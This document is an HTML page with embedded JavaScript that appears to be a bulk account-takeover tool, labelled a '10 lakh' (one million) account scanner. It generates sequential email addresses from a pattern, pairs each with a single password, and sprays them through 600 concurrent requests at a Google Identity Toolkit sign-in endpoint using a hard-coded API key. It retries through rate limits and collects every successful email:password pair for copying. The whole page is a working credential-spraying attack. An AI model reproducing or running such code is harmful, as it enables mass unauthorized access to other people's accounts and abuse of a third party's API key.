<!DOCTYPE html>
<html>
<head>
    <title>1-MILLION SEQUENTIAL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
        .bot-terminal { max-width: 500px; margin: auto; border: 2px solid #00ff00; background: #050505; padding: 20px; box-shadow: 0 0 40px #00ff00; border-radius: 8px; }
        h1 { font-size: 18px; border-bottom: 2px solid #00ff00; padding-bottom: 10px; color: #fff; }
        
        input { width: 100%; padding: 15px; margin: 8px 0; background: #111; border: 1px solid #00ff00; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; text-align: center; }
        .btn-ignite { width: 100%; padding: 20px; background: #00ff00; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
        
        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
        .stat-item { background: #111; padding: 15px; border: 1px solid #333; }
        .stat-item b { font-size: 30px; color: #fff; display: block; }

        #speed { font-size: 14px; color: #00ffff; margin-bottom: 10px; font-weight: bold; }
        #res-box { width: 100%; height: 320px; background: #000; color: #fff; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; margin-top: 10px; }
    </style>
</head>
<body>

<div class="bot-terminal">
    <h1>🚀 10 LAKH ACC SCANNER</h1>
    <div id="speed">STATUS: STANDBY</div>
    
    <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" placeholder="PASSWORD">
    
    <button class="btn-ignite" id="btn" onclick="ignite()">⚡ START SEQUENTIAL SCAN</button>

    <div class="monitor">
        <div>CHECKED<b id="c_val">0</b></div>
        <div>FOUND<b id="f_val">0</b></div>
    </div>

    <textarea id="res-box" readonly placeholder="Found List (Sequential 1,2,3...)"></textarea>
    
    <button onclick="copyHits()" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0; padding:10px; margin-top:10px; cursor:pointer;">📋 COPY ALL FOUND</button>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;
    let index = 0;
    let nextToProcess = 0;
    let resultsMap = new Map();
    let startTime;

    async function ignite() {
        if (active) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Fill Format and Pass!");

        active = true;
        startTime = Date.now();
        document.getElementById('btn').innerText = "🛑 STOP SYSTEM";
        document.getElementById('btn').style.background = "#f00";
        document.getElementById('btn').style.color = "#fff";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits); // 10 ലക്ഷം അക്കൗണ്ടുകൾ

        // --- HIGH-SPEED MULTI-THREADING (600 Workers) ---
        let threads = 600; 

        for (let i = 0; i < threads; i++) {
            (async function worker() {
                while (active && index < max) {
                    let currentIdx = index++;
                    let numStr = currentIdx.toString().padStart(digits, '0');
                    let email = fmt.replace(/\{(\d+)\}/, numStr);
                    
                    await checkAccount(email, pwd, key, currentIdx);
                }
            })();
        }

        setInterval(() => {
            if (!active) return;
            let elapsed = (Date.now() - startTime) / 1000;
            let currentSpeed = Math.round(checked / elapsed);
            document.getElementById('speed').innerText = `SPEED: ${currentSpeed} REQ/SEC`;
        }, 1000);
    }

    async function checkAccount(em, pw, k, idx) {
        try {
            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (res.status === 429) {
                // Rate limited: വിട്ടുപോകാതെ വീണ്ടും ട്രൈ ചെയ്യുന്നു
                await new Promise(r => setTimeout(r, 1000));
                return checkAccount(em, pw, k, idx);
            }

            let data = await res.json();
            resultsMap.set(idx, { found: (data && data.idToken), email: em });

            // --- STRICT SEQUENTIAL FLUSH (1, 2, 3...) ---
            while (resultsMap.has(nextToProcess)) {
                let current = resultsMap.get(nextToProcess);
                if (current.found) {
                    found++;
                    document.getElementById('f_val').innerText = found;
                    document.getElementById('res-box').value += current.email + ":" + pw + "\n";
                    document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
                }
                
                checked++;
                if (checked % 5 === 0) document.getElementById('c_val').innerText = checked;
                
                resultsMap.delete(nextToProcess);
                nextToProcess++;
            }

        } catch (e) {
            // നെറ്റ് എറർ വന്നാലും വിട്ടുപിടിക്കില്ല
            return checkAccount(em, pw, k, idx);
        }
    }

    function copyHits() {
        let t = document.getElementById('res-box');
        t.select();
        document.execCommand('copy');
        alert("Found accounts copied!");
    }
</script>

</body>
</html>
